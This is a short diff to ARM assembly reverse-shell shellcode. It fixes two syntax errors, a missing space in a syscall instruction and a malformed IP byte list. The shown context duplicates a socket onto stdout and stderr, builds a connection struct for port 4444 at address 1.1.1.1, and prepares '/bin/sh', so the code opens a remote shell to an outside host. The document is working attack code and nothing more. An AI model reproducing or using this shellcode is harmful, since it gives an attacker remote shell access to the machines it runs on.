@@ -53,7 +53,7 @@ _start:
 //dup2(sockfd, 1)
 	mov r0, r4		//saved sockid
 	add r1, #1		//stdout
-	svc#1
+	svc #1
 
 //dup2(sockfd, 2)
 	mov r0, r4		//saved sockid
@@ -73,6 +73,6 @@ _start:
 struct_addr:
 	.ascii "\x02\xff" //AF_INET 0xff will be NULLed
 	.ascii "\x11\x5c" //port number
-	.byte 1.1.1.1 //IP address
+	.byte 1,1,1,1 //IP address
 shellcode:
 	.ascii "/bin/shX" //null the X
